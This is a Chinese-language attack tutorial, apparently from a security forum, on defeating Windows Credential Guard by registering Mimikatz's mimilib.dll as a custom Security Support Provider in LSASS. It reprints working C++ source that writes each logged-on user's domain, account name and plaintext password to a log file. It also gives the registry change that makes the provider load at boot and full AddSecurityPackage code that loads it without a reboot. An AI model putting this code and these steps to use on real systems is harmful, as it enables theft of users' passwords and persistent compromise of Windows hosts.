Mimikatz Explorer - Custom SSP
==============================

TL;DR
=====

Windows Defender Credential Guard 使用基于虚拟化的安全性来隔离机密，依次保护 NTLM 密码哈希、Kerberos TGT 票据和应用程序存储为域凭据的凭据来防止凭据盗窃、哈希传递或票据传递等攻击。

如果我们在启用了 Credential Guard 的系统上尝试使用 Mimikatz 从 LSASS 进程内存中提取凭证，我们会观察到以下结果。

![img](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9a3e1464a7b572c5fbcbf44563a0bcdc2920adf4.png)

如上图所示，我们无法从 LSASS 内存中提取任何凭据，NTLM 哈希处显示的是 “LSA Isolated Data: NtlmHash”。并且，即便已经通过修改注册表启用了 Wdigest，也依然获取不到任何明凭据。

从 Windows 11 Enterprise, Version 22H2 和 Windows 11 Education, Version 22H 开始，兼容系统默认已启用 Windows Defender Credential Guard。不过，通过本篇文章的方法，可以轻松绕过 Credential Guard，并获取明文凭据。

Basic Knowledge
===============

Creating Custom Security Packages
---------------------------------

自定义安全包 API 支持组合开发自定义安全支持提供程序（SSP），后者为客户端/服务器应用程序提供非交互身份验证服务和安全消息交换，以及开发自定义身份验证包，为执行交互式身份验证的应用程序提供服务。这些服务在单个包中合并时称为安全支持提供程序/身份验证包（SSP/AP）。

SSP/AP 中部署的安全包与 LSA 完全集成。使用可用于自定义安全包的 LSA 支持函数，开发人员可以实现高级安全功能，例如令牌创建、 补充凭据支持和直通身份验证。

如果我们自定义安全支持提供程序/身份验证包（SSP/AP），并将其注册到系统，当用户重新进行交互式身份验证时，系统就会同通过我们自定义的 SSP/AP 传递明文凭据，这意味着我们可以提取到明文凭据并将其保存下来。这样便可以绕过 Credential Guard 的保护机制。

SSP/AP 安全包，为了同时执行身份验证包（AP）和安全支持提供程序（SSP），可以作为操作系统的一部分以及作为用户应用程序的一部分执行。这两种执行模式分别称为 LSA 模式和用户模式。这里我们需要的是 LSA 模式。

下面简单介绍一下关于 LSA 模式的初始化。

LSA Mode Initialization
-----------------------

### SECPKG\_FUNCTION\_TABLE

[SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/en-us/windows/win32/api/ntsecpkg/ns-ntsecpkg-secpkg_function_table) 结构包含指向安全包必须实现的 LSA 函数的指针。本地安全机构（LSA）在调用 [SpLsaModeInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-splsamodeinitializefn) 函数时从 SSP/AP DLL 获取此结构。

该结构语法如下：

```c++
typedef struct _SECPKG_FUNCTION_TABLE {
  PLSA_AP_INITIALIZE_PACKAGE              InitializePackage;
  PLSA_AP_LOGON_USER                      LogonUser;
  PLSA_AP_CALL_PACKAGE                    CallPackage;
  PLSA_AP_LOGON_TERMINATED                LogonTerminated;
  PLSA_AP_CALL_PACKAGE_UNTRUSTED          CallPackageUntrusted;
  PLSA_AP_CALL_PACKAGE_PASSTHROUGH        CallPackagePassthrough;
  PLSA_AP_LOGON_USER_EX                   LogonUserEx;
  PLSA_AP_LOGON_USER_EX2                  LogonUserEx2;
  SpInitializeFn                          *Initialize;
  SpShutdownFn                            *Shutdown;
  SpGetInfoFn                             *GetInfo;
  SpAcceptCredentialsFn                   *AcceptCredentials;
  SpAcquireCredentialsHandleFn            *AcquireCredentialsHandle;
  SpQueryCredentialsAttributesFn          *QueryCredentialsAttributes;
  SpFreeCredentialsHandleFn               *FreeCredentialsHandle;
  SpSaveCredentialsFn                     *SaveCredentials;
  SpGetCredentialsFn                      *GetCredentials;
  SpDeleteCredentialsFn                   *DeleteCredentials;
  SpInitLsaModeContextFn                  *InitLsaModeContext;
  SpAcceptLsaModeContextFn                *AcceptLsaModeContext;
  SpDeleteContextFn                       *DeleteContext;
  SpApplyControlTokenFn                   *ApplyControlToken;
  SpGetUserInfoFn                         *GetUserInfo;
  SpGetExtendedInformationFn              *GetExtendedInformation;
  SpQueryContextAttributesFn              *QueryContextAttributes;
  SpAddCredentialsFn                      *AddCredentials;
  SpSetExtendedInformationFn              *SetExtendedInformation;
  SpSetContextAttributesFn                *SetContextAttributes;
  SpSetCredentialsAttributesFn            *SetCredentialsAttributes;
  SpChangeAccountPasswordFn               *ChangeAccountPassword;
  SpQueryMetaDataFn                       *QueryMetaData;
  SpExchangeMetaDataFn                    *ExchangeMetaData;
  SpGetCredUIContextFn                    *GetCredUIContext;
  SpUpdateCredentialsFn                   *UpdateCredentials;
  SpValidateTargetInfoFn                  *ValidateTargetInfo;
  LSA_AP_POST_LOGON_USER                  *PostLogonUser;
  SpGetRemoteCredGuardLogonBufferFn       *GetRemoteCredGuardLogonBuffer;
  SpGetRemoteCredGuardSupplementalCredsFn *GetRemoteCredGuardSupplementalCreds;
  SpGetTbalSupplementalCredsFn            *GetTbalSupplementalCreds;
  PLSA_AP_LOGON_USER_EX3                  LogonUserEx3;
  PLSA_AP_PRE_LOGON_USER_SURROGATE        PreLogonUserSurrogate;
  PLSA_AP_POST_LOGON_USER_SURROGATE       PostLogonUserSurrogate;
  SpExtractTargetInfoFn                   *ExtractTargetInfo;
} SECPKG_FUNCTION_TABLE, *PSECPKG_FUNCTION_TABLE;
```

### LSA\_SECPKG\_FUNCTION\_TABLE

[LSA\_SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/win32/api/ntsecpkg/ns-ntsecpkg-lsa_secpkg_function_table) 结构包含指向安全包可以调用的 LSA 函数的指针。本地安全机构（LSA）在调用包的 [SpInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-spinitializefn) 函数时将此结构传递给安全包。

该结构语法如下：

```c++
typedef struct _LSA_SECPKG_FUNCTION_TABLE {
  PLSA_CREATE_LOGON_SESSION          CreateLogonSession;
  PLSA_DELETE_LOGON_SESSION          DeleteLogonSession;
  PLSA_ADD_CREDENTIAL                AddCredential;
  PLSA_GET_CREDENTIALS               GetCredentials;
  PLSA_DELETE_CREDENTIAL             DeleteCredential;
  PLSA_ALLOCATE_LSA_HEAP             AllocateLsaHeap;
  PLSA_FREE_LSA_HEAP                 FreeLsaHeap;
  PLSA_ALLOCATE_CLIENT_BUFFER        AllocateClientBuffer;
  PLSA_FREE_CLIENT_BUFFER            FreeClientBuffer;
  PLSA_COPY_TO_CLIENT_BUFFER         CopyToClientBuffer;
  PLSA_COPY_FROM_CLIENT_BUFFER       CopyFromClientBuffer;
  PLSA_IMPERSONATE_CLIENT            ImpersonateClient;
  PLSA_UNLOAD_PACKAGE                UnloadPackage;
  PLSA_DUPLICATE_HANDLE              DuplicateHandle;
  PLSA_SAVE_SUPPLEMENTAL_CREDENTIALS SaveSupplementalCredentials;
  PLSA_CREATE_THREAD                 CreateThread;
  PLSA_GET_CLIENT_INFO               GetClientInfo;
  PLSA_REGISTER_NOTIFICATION         RegisterNotification;
  PLSA_CANCEL_NOTIFICATION           CancelNotification;
  PLSA_MAP_BUFFER                    MapBuffer;
  PLSA_CREATE_TOKEN                  CreateToken;
  PLSA_AUDIT_LOGON                   AuditLogon;
  PLSA_CALL_PACKAGE                  CallPackage;
  PLSA_FREE_LSA_HEAP                 FreeReturnBuffer;
  PLSA_GET_CALL_INFO                 GetCallInfo;
  PLSA_CALL_PACKAGEEX                CallPackageEx;
  PLSA_CREATE_SHARED_MEMORY          CreateSharedMemory;
  PLSA_ALLOCATE_SHARED_MEMORY        AllocateSharedMemory;
  PLSA_FREE_SHARED_MEMORY            FreeSharedMemory;
  PLSA_DELETE_SHARED_MEMORY          DeleteSharedMemory;
  PLSA_OPEN_SAM_USER                 OpenSamUser;
  PLSA_GET_USER_CREDENTIALS          GetUserCredentials;
  PLSA_GET_USER_AUTH_DATA            GetUserAuthData;
  PLSA_CLOSE_SAM_USER                CloseSamUser;
  PLSA_CONVERT_AUTH_DATA_TO_TOKEN    ConvertAuthDataToToken;
  PLSA_CLIENT_CALLBACK               ClientCallback;
  PLSA_UPDATE_PRIMARY_CREDENTIALS    UpdateCredentials;
  PLSA_GET_AUTH_DATA_FOR_USER        GetAuthDataForUser;
  PLSA_CRACK_SINGLE_NAME             CrackSingleName;
  PLSA_AUDIT_ACCOUNT_LOGON           AuditAccountLogon;
  PLSA_CALL_PACKAGE_PASSTHROUGH      CallPackagePassthrough;
  CredReadFn                         *CrediRead;
  CredReadDomainCredentialsFn        *CrediReadDomainCredentials;
  CredFreeCredentialsFn              *CrediFreeCredentials;
  PLSA_PROTECT_MEMORY                DummyFunction1;
  PLSA_PROTECT_MEMORY                DummyFunction2;
  PLSA_PROTECT_MEMORY                DummyFunction3;
  PLSA_PROTECT_MEMORY                LsaProtectMemory;
  PLSA_PROTECT_MEMORY                LsaUnprotectMemory;
  PLSA_OPEN_TOKEN_BY_LOGON_ID        OpenTokenByLogonId;
  PLSA_EXPAND_AUTH_DATA_FOR_DOMAIN   ExpandAuthDataForDomain;
  PLSA_ALLOCATE_PRIVATE_HEAP         AllocatePrivateHeap;
  PLSA_FREE_PRIVATE_HEAP             FreePrivateHeap;
  PLSA_CREATE_TOKEN_EX               CreateTokenEx;
  CredWriteFn                        *CrediWrite;
  CrediUnmarshalandDecodeStringFn    *CrediUnmarshalandDecodeString;
  PLSA_PROTECT_MEMORY                DummyFunction4;
  PLSA_PROTECT_MEMORY                DummyFunction5;
  PLSA_PROTECT_MEMORY                DummyFunction6;
  PLSA_GET_EXTENDED_CALL_FLAGS       GetExtendedCallFlags;
  PLSA_DUPLICATE_HANDLE              DuplicateTokenHandle;
  PLSA_GET_SERVICE_ACCOUNT_PASSWORD  GetServiceAccountPassword;
  PLSA_PROTECT_MEMORY                DummyFunction7;
  PLSA_AUDIT_LOGON_EX                AuditLogonEx;
  PLSA_CHECK_PROTECTED_USER_BY_TOKEN CheckProtectedUserByToken;
  PLSA_QUERY_CLIENT_REQUEST          QueryClientRequest;
  PLSA_GET_APP_MODE_INFO             GetAppModeInfo;
  PLSA_SET_APP_MODE_INFO             SetAppModeInfo;
} LSA_SECPKG_FUNCTION_TABLE, *PLSA_SECPKG_FUNCTION_TABLE;
```

### LSA Mode Initialization

启动计算机系统后，本地安全机构（LSA）会自动将所有已注册的安全支持提供程序/身份验证包（SSP/AP）的 DLL 加载到其进程空间中，下图显示了初始化过程。

![lsa mode initialization](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cc4efc29e3b7dd4e142d7ea512ebf77631f867e0.png)

> “Kerberos” 表示 Microsoft Kerberos SSP/AP，“My SSP/AP” 表示包含两个自定义安全包的自定义 SSP/AP。

启动时，LSA 调用每个 SSP/AP 中的 [SpLsaModeInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-splsamodeinitializefn) 函数，以获取指向 DLL 中每个安全包实现的函数的指针，函数指针以 [SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-secpkg_function_table) 结构数组的形式传递给 LSA。

![the lsa calls splsamodeinitialize to get function pointers](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-76ee16c12f6669bf3af02d02ebb6ada7e4a408ba.png)

收到一组 [SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-secpkg_function_table) 结构后，LSA 将调用每个安全包所实现的 [SpInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-spinitializefn) 函数。LSA 使用此函数调用传递给每个安全包一个 [LSA\_SECPKG\_FUNCTION\_TABLE](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/ns-ntsecpkg-lsa_secpkg_function_table) 结构，其中包含指向安全包调用的 LSA 函数的指针。除了存储指向 LSA 支持函数的指针外，自定义安全包还应使用 [SpInitialize()](https://learn.microsoft.com/zh-cn/windows/desktop/api/Ntsecpkg/nc-ntsecpkg-spinitializefn) 函数的实现来执行任何与初始化相关的处理。

Main Detail
===========

Mimikatz 提供的 mimilib.dll 可被注册到系统中作为一个 SSP，为攻击者提供一种方法来检索由受害者输入的凭证，以下为主要功能的实现代码。

```c++
#include "kssp.h"

static SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable[] = {
    {
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};

NTSTATUS NTAPI kssp_SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpShutDown(void)
{
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion   = 1;
    PackageInfo->wRPCID     = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->Name       = L"KiwiSSP";
    PackageInfo->Comment    = L"Kiwi Security Support Provider";
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    FILE *kssp_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kssp_logfile = _wfopen(L"kiwissp.log", L"a"))
#pragma warning(pop)
    {
        klog(kssp_logfile, L"[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t", PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, LogonType, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, AccountName);
        klog_password(kssp_logfile, &PrimaryCredentials->Password);
        klog(kssp_logfile, L"\n");
        fclose(kssp_logfile);
    }
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = kiwissp_SecPkgFunctionTable;
    *pcTables = ARRAYSIZE(kiwissp_SecPkgFunctionTable);
    return STATUS_SUCCESS;
}
```

kiwissp\_SecPkgFunctionTable
----------------------------

kiwissp\_SecPkgFunctionTable 是一个 SECPKG\_FUNCTION\_TABLE 结构的数组，包含指向安全包必须实现的 LSA 函数的指针。这里主要实现了 `kssp_SpInitialize`、`kssp_SpShutDown`、`kssp_SpGetInfo`、`kssp_SpAcceptCredentials` 和 `kssp_SpLsaModeInitialize` 函数。

kssp\_SpInitialize
------------------

kssp\_SpInitialize 实现了 SpInitialize 函数，该函数定义如下：

```c++
NTSTATUS Spinitializefn(
  [in] ULONG_PTR PackageId,
  [in] PSECPKG_PARAMETERS Parameters,
  [in] PLSA_SECPKG_FUNCTION_TABLE FunctionTable
);
```

参数如下：

- \[in\] PackageId：LSA 分配给每个安全包的唯一标识符。该值在重新启动系统之前有效。
- \[in\] Parameters：指向包含主域和计算机状态信息的 `SECPKG_PARAMETERS` 结构的指针。
- \[in\] FunctionTable：指向可以安全包调用的 LSA 函数的指针列表。

该函数由本地安全机构（LSA）调用一次，用于执行任何与初始化相关的处理，并提供一个函数指针列表，其中包含安全包调用的 LSA 函数的指针。

kssp\_SpShutDown
----------------

kssp\_SpShutDown 实现了 SpShutDown 函数，该函数定义如下：

```c++
NTSTATUS SpShutDown(void);
```

该函数在卸载安全支持提供程序/身份验证包 (SSP/AP) 之前，由本地安全机构（LSA）调用，用于在卸载 SSP/AP 之前执行所需的任何清理，以便释放资源。

kssp\_SpGetInfo
---------------

kssp\_SpGetInfo 函数实现了 SpGetInfo 函数，该函数定义如下：

```c++
NTSTATUS Spgetinfofn(
  [out] PSecPkgInfo PackageInfo
);
```

参数如下：

- \[out\] PackageInfo：指向由本地安全机构（LSA）分配的 SecPkgInfo 结构的指针，必须由包填充。

SpGetInfo 函数提供有关安全包的一般信息，例如其名称和功能描述。客户端调用安全支持提供程序接口（SSPI）的 QuerySecurityPackageInfo 函数时，将调用 SpGetInfo 函数。

kssp\_SpAcceptCredentials
-------------------------

kssp\_SpAcceptCredentials 函数实现了 SpAcceptCredentials 函数，该函数定义如下：

```c++
NTSTATUS Spacceptcredentialsfn(
  [in] SECURITY_LOGON_TYPE LogonType,
  [in] PUNICODE_STRING AccountName,
  [in] PSECPKG_PRIMARY_CRED PrimaryCredentials,
  [in] PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
);
```

参数如下：

- \[in\] LogonType：指示登录类型的 `SECURITY_LOGON_TYPE` 值。
- \[in\] AccountName：指向存储登录帐户名称的 `UNICODE_STRING` 结构的指针。
- \[in\] PrimaryCredentials：指向包含登录凭据的 `SECPKG_PRIMARY_CRED` 结构的指针。
- \[in\] SupplementalCredentials：指向包含特定于包的补充凭据的 `ECPKG_SUPPLEMENTAL_CRED` 结构的指针。

SpAcceptCredentials 函数由本地安全机构（LSA）调用，以将为经过身份验证的安全主体存储的任何凭据传递给安全包。为 LSA 存储的每组凭据调用一次此函数。

将编译生成的 mimilib.dll 置于 C:\\Windows\\System32 目录中，并将 “mimilib” 添加到以下注册表值的数据中，如下图所示。

```c++
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages
```

![image-20230530192448724](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-26d3991c9884ba27dad389e335bd77fe5e8e20ba.png)

当该主机重新启动并进行交互式身份验证时，将在 C:\\Windows\\System32\\kiwissp.log 中记录当前登录用户的明文密码，如下图所示。

![image-20230530192752538](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-542e69f92eb164b4ca673dbf1710363ccada38fb.png)

列举已加载的 SSP
==========

我们可以通过以下代码，列举当前系统中已经加载的 SSP：

```c++
// ListSSPs.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#define SECURITY_WIN32

#include <stdio.h>
#include <Windows.h>
#include <sspi.h>
#include <Security.h>

#pragma comment(lib, "Secur32.lib")

int wmain(int argc, wchar_t* argv[]) {
    ULONG packageCount = 0;
    PSecPkgInfoW packages;

    if (EnumerateSecurityPackagesW(&packageCount, &packages) == SEC_E_OK) {
        for (int i = 0; i < packageCount; i++) {
            wprintf(L"Name: %s    Comment: %s\n", packages[i].Name, packages[i].Comment);
        }
    }
}
```

如下图所示，KiwiSSP 已经加载到了当前系统中：

![image-20230531104250371](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-708b4bf3b162c32b8b887e4eaa69aaeea2991d0e.png)

利用 AddSecurityPackage API 来加载 SSP/AP
====================================

到目前为止，成功利用自定义 SSP 的条件是必须重新启动系统。因此只有启动计算机系统后，本地安全机构（LSA）才会自动将已注册的 SSP/AP 的 DLL 加载到其进程空间中。

然而，利用某些 Windows API，我们可以在不重启的情况下添加 SSP/AP。

AddSecurityPackage 是一个 SSPI 函数，用于将安全支持提供程序添加到提供程序列表中，该函数声明如下。

```C++
SECURITY_STATUS SEC_ENTRY AddSecurityPackageW(
  [in] LPSTR                     pszPackageName,
  [in] PSECURITY_PACKAGE_OPTIONS pOptions
);
```

参数如下：

- \[in\] pszPackageName：要添加的包的名称。
- \[in\] pOptions：指向 `SECURITY_PACKAGE_OPTIONS` 结构的指针，该结构指定有关安全包的其他信息。

通过 C/C++ 创建一个名为 AddSSP 的项目，其代码如下所示。

```c++
#define SECURITY_WIN32

#include <stdio.h>
#include <Windows.h>
#include <Security.h>
#pragma comment(lib,"Secur32.lib")

int wmain(int argc, char** argv) {

    SECURITY_PACKAGE_OPTIONS option;
    option.Size = sizeof(option);
    option.Flags = 0;
    option.Type = SECPKG_OPTIONS_TYPE_LSA;
    option.SignatureSize = 0;
    option.Signature = NULL;

    // AddSecurityPackageW 默认在 System32 目录中搜索 mimilib.dll
    if (AddSecurityPackageW((LPWSTR)L"mimilib", &option) == SEC_E_OK)
    {
        wprintf(L"[*] Add security package successfully\n");
    }
}
```

编译并生成 AddSSP.exe 后，运行 AddSSP.exe 即可成功将 mimilib.dll 添加到系统。需要注意的是，以上代码仅将 CustSSP 加载到 LSASS 进程中，重启系统后会失效。